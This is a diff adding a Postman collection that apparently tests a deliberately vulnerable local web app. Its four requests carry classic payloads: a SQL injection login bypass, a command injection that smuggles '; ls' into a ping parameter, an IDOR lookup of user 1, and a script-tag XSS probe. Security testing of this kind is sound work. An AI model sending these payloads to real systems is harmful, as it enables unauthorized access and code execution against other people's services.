@@ -1,0 +1,43 @@
+{
+  "info": {
+    "name": "Vulnerable App Security Tests",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "SQL Injection Test - Bypass Auth",
+      "request": {
+        "method": "POST",
+        "url": "http://host.docker.internal:5000/login",
+        "body": {
+          "mode": "urlencoded",
+          "urlencoded": [
+            {"key": "username", "value": "admin' OR '1'='1", "type": "text"},
+            {"key": "password", "value": "anything", "type": "text"}
+          ]
+        }
+      }
+    },
+    {
+      "name": "Command Injection Test",
+      "request": {
+        "method": "GET",
+        "url": "http://host.docker.internal:5000/ping?ip=127.0.0.1; ls"
+      }
+    },
+    {
+      "name": "IDOR Test - Access Admin Data",
+      "request": {
+        "method": "GET",
+        "url": "http://host.docker.internal:5000/user/1"
+      }
+    },
+    {
+      "name": "XSS Test",
+      "request": {
+        "method": "GET",
+        "url": "http://host.docker.internal:5000/?name=<script>alert('XSS')</script>"
+      }
+    }
+  ]
+}
